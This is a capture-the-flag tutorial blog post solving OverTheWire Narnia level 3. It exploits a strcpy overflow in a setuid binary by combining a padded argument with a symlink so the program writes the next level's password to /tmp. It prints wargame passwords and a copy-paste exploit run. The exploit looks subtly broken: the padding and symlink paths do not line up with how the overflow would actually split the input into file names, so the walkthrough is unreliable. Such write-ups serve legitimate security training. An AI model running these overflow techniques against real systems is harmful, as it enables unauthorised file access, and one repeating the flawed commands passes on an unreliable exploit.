---
date: 2023-08-21 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 3 → 4 tutorial!!"
permalink: /posts/overTheWire-Narnia-Level-3-to-4/
tags: [overthewire, narnia, pwn, overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 3 → 4!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-2-to-3/' | relative_url }}">← Previous: Level 2 → 3</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia4.html" target="_blank" rel="noopener">Official (Level 4) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-4-to-5/' | relative_url }}">Next: Level 4 → 5 →</a>
  </div>
</nav>

## Login

Use the password from Level 2 → 3 (`vaequeezee` in my run):

```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
# password: vaequeezee
````

---

## Task

Binary to exploit: **`/narnia/narnia3`**

It takes a filename as argument, and copies its contents to a destination file. By default the destination file is **`/dev/null`**, but the program uses **unsafe strcpy into a small buffer**, so we can overflow and overwrite the destination path.

---

## A little bit of Theory

* `ofile[16] = "/dev/null";` → destination filename buffer is **16 bytes**.
* `strcpy(ifile, argv[1]);` with **no bounds check** means supplying >32 bytes for `ifile` overflows into **`ofile`**.
* Overwriting `ofile` lets us choose **where the program writes**.
* Trick: create a **symlink** so the program writes the secret password file into a world-readable temp file.

**Further reading**:

* `man 3 strcpy`
* [Unsafe string handling in C](https://en.wikipedia.org/wiki/Buffer_overflow)
* Linux symlinks basics (`ln -s`)

---

## Source Code

```c
int main(int argc, char **argv){
    int ifd, ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    read(ifd, buf, sizeof(buf)-1);
    write(ofd, buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    close(ifd);
    close(ofd);
    exit(1);
}
```

---

## Solution

### Step 1 — Trigger usage

```bash
./narnia3
# usage: ./narnia3 file, will send contents of file 2 /dev/null
```

Confirms we need to provide a filename.

---

### Step 2 — Overflow `ofile` in GDB

```bash
gdb /narnia/narnia3
(gdb) break *main+93     # right before open() of ofile
(gdb) run $(python3 -c 'print("A"*32 + "BBBB")')
```

Check `$eax` → now points to `"BBBB"`.
So after 32 chars, we control the output path.

---

### Step 3 — Craft exploit path

We want to overwrite `/dev/null` with a **custom path** under `/tmp`.

```bash
mkdir -p /tmp/FOOBARFOOBARFOO/tmp
ln -s /etc/narnia_pass/narnia4 /tmp/FOOBARFOOBARFOO/tmp/ax
touch /tmp/ax
chmod 777 /tmp/ax
```

---

### Step 4 — Run the exploit

```bash
./narnia3 $(python3 -c 'print("A"*32 + "/tmp/FOOBARFOOBARFOO/tmp/ax")')
```

The program writes the contents of `/etc/narnia_pass/narnia4` into `/tmp/ax`.

---

### Step 5 — Read the password

```bash
cat /tmp/ax
# thaenohtai  (example from my run)
```

Boom 🎉 we got the next password.

---

## Password

```
thaenohtai
```

---

## Troubleshooting

* **Segmentation fault immediately** → You used too many/few padding bytes. The correct offset is **32**.
* **Permission denied writing file** → Ensure your target is writable (e.g., `/tmp` with `chmod 777`).
* **Garbage output** → Double-check your symlink points to the actual `/etc/narnia_pass/narnia4`.

---

## Copy-paste quick run

```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
# password: vaequeezee

cd /narnia
mkdir -p /tmp/FOOBARFOOBARFOO/tmp
ln -s /etc/narnia_pass/narnia4 /tmp/FOOBARFOOBARFOO/tmp/ax
touch /tmp/ax
chmod 777 /tmp/ax

./narnia3 $(python3 -c 'print("A"*32 + "/tmp/FOOBARFOOBARFOO/tmp/ax")')
cat /tmp/ax
```

---

**Congrats 🎉** You exploited a **strcpy overflow** to redirect file writes and captured the password for **narnia4**. Onward to **Level 4 → 5**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

